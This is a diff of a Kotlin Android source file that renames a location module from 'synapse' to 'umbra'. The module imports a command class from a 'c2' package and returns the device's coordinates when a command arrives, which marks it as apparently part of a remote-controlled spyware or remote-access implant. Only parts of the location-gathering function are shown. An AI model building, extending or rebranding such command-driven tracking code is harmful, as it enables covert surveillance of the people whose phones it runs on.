@@ -1,4 +1,4 @@
-package org.synapse.core.modules
+package org.umbra.core.modules
 
 import android.Manifest
 import android.content.Context
@@ -7,8 +7,8 @@ import android.location.Location
 import android.location.LocationManager
 import androidx.core.content.ContextCompat
 import com.google.android.gms.location.*
-import org.synapse.core.c2.Command
-import org.synapse.core.core.SynapseResponse
+import org.umbra.core.c2.Command
+import org.umbra.core.core.UmbraResponse
 import kotlinx.coroutines.suspendCancellableCoroutine
 import kotlinx.coroutines.withTimeoutOrNull
 import kotlin.coroutines.resume
@@ -24,13 +24,13 @@ object LocationModule {
      *
      * Returns partial results with whatever accuracy is available.
      */
-    suspend fun get(context: Context, cmd: Command): SynapseResponse {
+    suspend fun get(context: Context, cmd: Command): UmbraResponse {
         val hasFine = ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION)
         val hasCoarse = ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION)
 
         if (hasFine != PackageManager.PERMISSION_GRANTED &&
             hasCoarse != PackageManager.PERMISSION_GRANTED) {
-            return SynapseResponse.ErrorResponse(error = "no_location_permission", module = "location")
+            return UmbraResponse.ErrorResponse(error = "no_location_permission", module = "location")
         }
 
         // ── 1. Try FusedLocationProvider with 30s timeout ──
@@ -126,7 +126,7 @@ object LocationModule {
         }
 
         if (bestLocation != null) {
-            return SynapseResponse.LocationResponse(
+            return UmbraResponse.LocationResponse(
                 lat = bestLocation.latitude,
                 lng = bestLocation.longitude,
                 accuracy = bestLocation.accuracy,
@@ -134,7 +134,7 @@ object LocationModule {
             )
         } else {
             val detail = if (errors.isNotEmpty()) errors.joinToString("; ") else "all providers exhausted"
-            return SynapseResponse.ErrorResponse(error = "location_timeout:$detail", module = "location")
+            return UmbraResponse.ErrorResponse(error = "location_timeout:$detail", module = "location")
         }
     }
 
